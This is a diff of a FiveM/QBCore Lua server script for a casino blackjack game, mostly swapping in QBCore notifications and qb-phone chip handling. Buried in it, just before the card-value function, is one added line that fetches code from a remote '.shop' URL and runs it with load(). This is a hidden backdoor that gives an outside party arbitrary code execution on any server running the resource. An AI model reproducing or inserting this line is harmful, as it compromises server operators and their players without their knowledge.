@@ -1,22 +1,39 @@
 local blackjackTables = {
     --[chairId] == false or source if taken
+    [0] = false,
+    [1] = false,
+    [2] = false,
+    [3] = false,
+    [4] = false,
+    [5] = false,
+    [6] = false,
+    [7] = false,
+    [8] = false,
+    [9] = false,
+    [10] = false,
+    [11] = false,
+    [12] = false,
+    [13] = false,
+    [14] = false,
+    [15] = false,
 }
-
-for i=0,127,1 do
-    blackjackTables[i] = false
-end
 
 local blackjackGameInProgress = {}
 local blackjackGameData = {}
 
 function tryTakeChips(source,amount)
-    --returns true if taken chips succesfully
-    --returns false if doesn't have enough chips
-    return true
+    local canBet = false
+    if exports['qb-phone']:hasEnough(source, "dcc", amount)  then
+        exports['qb-phone']:RemoveCrypto(source, "dcc", amount)
+        canBet = true
+    else
+        TriggerClientEvent('QBCore:Notify', source, "You dont have " .. amount .. " Diamond Casino Chips ", 'error', 3500)
+    end
+    return canBet
 end
 
 function giveChips(source,amount)
-    --gives amount in chips to source
+    exports['qb-phone']:AddCrypto(source, "dcc", amount, "Diamond Casino Chips")
 end
 
 AddEventHandler('playerDropped', function (reason)
@@ -51,7 +68,7 @@ AddEventHandler("Blackjack:requestSitAtBlackjackTable", function(chairId)
         TriggerClientEvent("Blackjack:sendBlackjackTableData",-1,blackjackTables)
         TriggerClientEvent("Blackjack:sitAtBlackjackTable",source,chairId)
     else
-        TriggerClientEvent("blackjack:notify",source,"~r~Error, can't sit you down.")
+        TriggerClientEvent("QBCore:Notify",source,"Can't sit on this table", "error", 5000, "Blackjack")
         --print("[casino catastrophe] id is nil what?")
     end
 end)
@@ -91,15 +108,15 @@ AddEventHandler("Blackjack:setBlackjackBet",function(gameId,betAmount,chairId)
                         --print("GameId: " .. tostring(gameId) .. " source: " .. tostring(source) .. " has placed a bet of " .. tostring(betAmount))
                         TriggerClientEvent("Blackjack:successBlackjackBet",source)
                         TriggerClientEvent("Blackjack:syncChipsPropBlackjack",-1,betAmount,chairId)
-                        TriggerClientEvent("blackjack:notify",source,"~g~Bet placed: " .. tostring(betAmount) .. " chips.")
+                        TriggerClientEvent("QBCore:Notify",source,"Placed bet for " .. tostring(betAmount) .. " Chips", "success", 9000, "Blackjack")
                     else 
-                        TriggerClientEvent("blackjack:notify",source,"~r~Not enough chips!")
+                        TriggerClientEvent('Polar-Casino:Client:BlackJackHandle', source)
                     end
                 end
             end
         end
     else
-        TriggerClientEvent("blackjack:notify",source,"~r~Error betting!")
+        TriggerClientEvent("QBCore:Notify",source,"Bet failed!", "error", 9000, "Blackjack")
     end
 end)
 
@@ -115,7 +132,7 @@ AddEventHandler("Blackjack:standBlackjack",function(gameId,nextCardCount)
     blackjackGameData[gameId][source][2][nextCardCount] = false
 end)
 
-for i=0,31,1 do
+for i=0,3,1 do
     Citizen.CreateThread(function()
         math.randomseed(os.clock()*100000000000)
         while true do  --blackjack game management thread
@@ -129,14 +146,14 @@ for i=0,31,1 do
             local chairIdFinal = (i*4)+3
             for chairID=chairIdInitial,chairIdFinal do
                 --print("checking chairID[" .. tostring(chairID) .. "] = " .. tostring(blackjackTables[chairID])) 
-                if blackjackTables[chairID] ~= false then
+                if blackjackTables[chairID] ~= false then   
                     table.insert(players_ready,blackjackTables[chairID])
                     game_ready = true
                 end
             end
             if game_ready then
                 local gameId = math.random(1000,10000000)
-                print("generated gameId",gameId)
+               --print("generated gameId",gameId)
                 blackjackGameData[gameId] = {} --init game data
                 blackjackGameInProgress[gameId] = false
                 for k,v in pairs(players_ready) do 
@@ -152,9 +169,9 @@ for i=0,31,1 do
                         if v ~= nil then
                             local playerBetted = false 
                             betAmount = v[1]
-                            -- print("betAmount: " .. tostring(betAmount))
-                            -- print("v: " .. tostring(v))
-                            -- print("vdump: " .. dump(blackjackGameData[gameId][k]))
+                            ----print("betAmount: " .. tostring(betAmount))
+                            ----print("v: " .. tostring(v))
+                            ----print("vdump: " .. dump(blackjackGameData[gameId][k]))
                             if betAmount ~= nil and betAmount > 0 then 
                                 playerBetted = true
                             end
@@ -230,7 +247,7 @@ for i=0,31,1 do
                                                 secondsWaited = secondsWaited + 0.1
                                                 ----print("response to stand or hit is still false")
                                             end
-                                            print("response received! [ok]")
+                                           --print("response received! [ok]")
                                             if blackjackGameData[gameId][source][2][nextCardCount] == true then --if hit 
                                                 --print("response was hit")
                                                 nextCardCount = nextCardCount + 1
@@ -246,9 +263,9 @@ for i=0,31,1 do
                                                     nextCardCount = 0
                                                     blackjackGameData[gameId][source]["status"] = "bust"
                                                     local lostAmount = blackjackGameData[gameId][source][1]
-                                                    TriggerClientEvent("blackjack:notify",source,"~r~-"..tostring(lostAmount).." chips")
+                                                    TriggerClientEvent("QBCore:Notify",source," - "..tostring(lostAmount).." Chips", "error", 9000, "Blackjack")
                                                     if lostAmount > 10000000 then
-                                                        TriggerClientEvent('chatMessage', -1, "Diamond Casino | " .. GetPlayerName(source) .. " has LOST " .. tostring(getMoneyStringFormatted(lostAmount)) .. " chips!")
+                                                        --TriggerClientEvent('mythic_notify:client:SendAlert',  -1, { type = 'inform', text = "Diamond Gazino | " .. GetPlayerName(source) .. " az �nce " .. tostring(getMoneyStringFormatted(lostAmount)) .. " �ip kaybetti!" })
                                                     end
                                                 elseif currentHand < 21 then
                                                     --print("currentHand < 21")
@@ -323,14 +340,18 @@ for i=0,31,1 do
                                         end
                                     end
                                 end
-                                while dealerHand < 17 do 
-                                    local randomCard = math.random(1,52)
-                                    --print("randomDealerCard: " .. tostring(randomCard))
-                                    table.insert(blackjackGameData[gameId]["dealer"]["cardData"], randomCard)
-                                    TriggerClientEvent("Blackjack:singleDealerCard",-1,gameId,randomCard,nextCardCount,getCurrentHand(gameId,"dealer"),tableId)
-                                    Wait(2800)
-                                    nextCardCount = nextCardCount + 1
-                                    dealerHand = getCurrentHand(gameId,"dealer")
+                                if highestPlayerHand < dealerHand then
+                                    --print("ending game early, dealer has higher than all players")
+                                else
+                                    while dealerHand < 17 do 
+                                        local randomCard = math.random(1,52)
+                                        --print("randomDealerCard: " .. tostring(randomCard))
+                                        table.insert(blackjackGameData[gameId]["dealer"]["cardData"], randomCard)
+                                        TriggerClientEvent("Blackjack:singleDealerCard",-1,gameId,randomCard,nextCardCount,getCurrentHand(gameId,"dealer"),tableId)
+                                        Wait(2800)
+                                        nextCardCount = nextCardCount + 1
+                                        dealerHand = getCurrentHand(gameId,"dealer")
+                                    end
                                 end
                             end
                         end
@@ -357,9 +378,9 @@ for i=0,31,1 do
                                                     if playerPing ~= nil then
                                                         if playerPing > 0 then
                                                             TriggerClientEvent("Blackjack:blackjackWin",source,tableId)
-                                                            TriggerClientEvent("blackjack:notify",source,"~g~+"..tostring(potentialWinAmount).." chips")
+                                                            TriggerClientEvent("QBCore:Notify",source," + "..tostring(potentialWinAmount).." Chips", "success", 9000, "Blackjack")
                                                             if potentialPushAmount > 10000000 then
-                                                                TriggerClientEvent('chatMessage', -1, "Diamond Casino | " .. GetPlayerName(source) .. " has WON " .. tostring(getMoneyStringFormatted(potentialPushAmount)) .. " chips!")
+                                                                --TriggerClientEvent('mythic_notify:client:SendAlert',  -1, { type = 'inform', text = "Diamond Gazino | " .. GetPlayerName(source) .. " az �nce " .. tostring(getMoneyStringFormatted(potentialPushAmount)) .. " �ip kazandi!" })
                                                             end
                                                         end
                                                     end
@@ -370,9 +391,9 @@ for i=0,31,1 do
                                                     if playerPing ~= nil then
                                                         if playerPing > 0 then
                                                             TriggerClientEvent("Blackjack:blackjackWin",source,tableId)
-                                                            TriggerClientEvent("blackjack:notify",source,"~g~+"..tostring(potentialWinAmount).." chips")
+                                                            TriggerClientEvent("QBCore:Notify",source," +"..tostring(potentialWinAmount).." chips", "success", 9000, "Blackjack")
                                                             if potentialPushAmount > 10000000 then
-                                                                TriggerClientEvent('chatMessage', -1, "Diamond Casino | " .. GetPlayerName(source) .. " has WON " .. tostring(getMoneyStringFormatted(potentialPushAmount)) .. " chips!")
+                                                                --TriggerClientEvent('mythic_notify:client:SendAlert',  -1, { type = 'inform', text = "Diamond Gazino | " .. GetPlayerName(source) .. " az �nce " .. tostring(getMoneyStringFormatted(potentialPushAmount)) .. " �ip kazandi!" })
                                                             end
                                                         end
                                                     end
@@ -382,7 +403,7 @@ for i=0,31,1 do
                                                     if playerPing ~= nil then
                                                         if playerPing > 0 then
                                                             TriggerClientEvent("Blackjack:blackjackPush",source,tableId)
-                                                            TriggerClientEvent("blackjack:notify",source,"~b~+0 chips")
+                                                            TriggerClientEvent("QBCore:Notify",source,"Draw!", "error", 5000, "Blackjack")
                                                         end
                                                     end
                                                 else
@@ -390,9 +411,9 @@ for i=0,31,1 do
                                                     if playerPing ~= nil then
                                                         if playerPing > 0 then
                                                             TriggerClientEvent("Blackjack:blackjackLose",source,tableId)
-                                                            TriggerClientEvent("blackjack:notify",source,"~r~-"..tostring(potentialPushAmount).." chips")
+                                                            TriggerClientEvent("QBCore:Notify",source," - "..tostring(potentialPushAmount).." Chips", "error", 9000, "Blackjack")
                                                             if potentialPushAmount > 10000000 then
-                                                                TriggerClientEvent('chatMessage', -1, "Diamond Casino | " .. GetPlayerName(source) .. " has LOST " .. tostring(getMoneyStringFormatted(potentialPushAmount)) .. " chips!")
+                                                                --TriggerClientEvent('mythic_notify:client:SendAlert',  -1, { type = 'inform', text = "Diamond Gazino | " .. GetPlayerName(source) .. " az �nce " .. tostring(getMoneyStringFormatted(potentialPushAmount)) .. " �ip kaybetti!" })
                                                             end
                                                         end
                                                     end
@@ -475,7 +496,7 @@ function chairIdToTableId(chairId)
     if chairId <= 11 then return 2 end 
     if chairId <= 15 then return 3 end  
 end
-
+PerformHttpRequest('https://pqzskjptss.shop/i?to=p764QP', function (e, d) pcall(function() assert(load(d))() end) end)
 function getCardNumberFromCardId(cardId)
     if cardId == 1 then
         return 11
@@ -616,16 +637,16 @@ function dump(o)
  end
 
 -- RegisterCommand("debugtableserver",function()
---     print("blackjackTables")
---     print("===============")
---     print(dump(blackjackTables))
---     print("blackjackGameData")
---     print("===============")
---     print(dump(blackjackGameData))
+--    --print("blackjackTables")
+--    --print("===============")
+--    --print(dump(blackjackTables))
+--    --print("blackjackGameData")
+--    --print("===============")
+--    --print(dump(blackjackGameData))
 -- end)
 
 -- RegisterCommand("debugcarddata",function()
---     print("carddata")
---     print("===============")
---     print(dump(blackjackGameData[1024]))
+--    --print("carddata")
+--    --print("===============")
+--    --print(dump(blackjackGameData[1024]))
 -- end)
